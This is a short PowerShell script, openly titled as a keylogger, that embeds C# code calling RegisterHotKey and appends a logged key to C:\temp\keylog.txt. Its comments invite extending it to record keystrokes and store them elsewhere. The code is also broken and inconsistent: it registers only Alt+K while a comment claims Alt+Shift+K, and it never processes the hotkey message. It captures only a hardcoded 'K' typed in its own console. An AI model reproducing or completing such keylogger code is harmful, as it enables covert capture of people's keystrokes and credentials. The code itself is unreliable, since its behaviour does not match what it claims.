# PowerShell Keylogger using RegisterHotKey function

Add-Type -TypeDefinition @'
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

public class Keylogger {
    [DllImport("user32.dll")]
    public static extern bool RegisterHotKey(IntPtr hWnd, int id, uint fsModifiers, uint vk);

    [DllImport("user32.dll")]
    public static extern bool UnregisterHotKey(IntPtr hWnd, int id);

    private const int MOD_ALT = 0x0001; // Alt key modifier
    private const int WM_HOTKEY = 0x0312; // Hotkey message

    public static void Main(string[] args) {
        IntPtr hWnd = Process.GetCurrentProcess().MainWindowHandle;
        int hotkeyId = 1; // You can change this to any unique value

        // Register Alt + Shift + K as the hotkey (you can change this combination)
        RegisterHotKey(hWnd, hotkeyId, MOD_ALT, (uint)0x4B);

        // This loop is needed to keep the script running
        while (true) {
            try {
                // Listen for the hotkey
                if (Console.ReadKey(true).Key == ConsoleKey.K) {
                    // Log the key (you can modify this to store the data elsewhere)
                    string key = "K"; // Replace this with the desired key logging behavior
                    string logPath = "C:\\temp\\keylog.txt"; // Replace this with the desired log file path
                    System.IO.File.AppendAllText(logPath, key + Environment.NewLine);
                }
            } catch {
                // Handle any errors here, or you can choose to ignore them
            }
        }
    }
}
'@

# Run the Keylogger
[Keylogger]::Main(@())
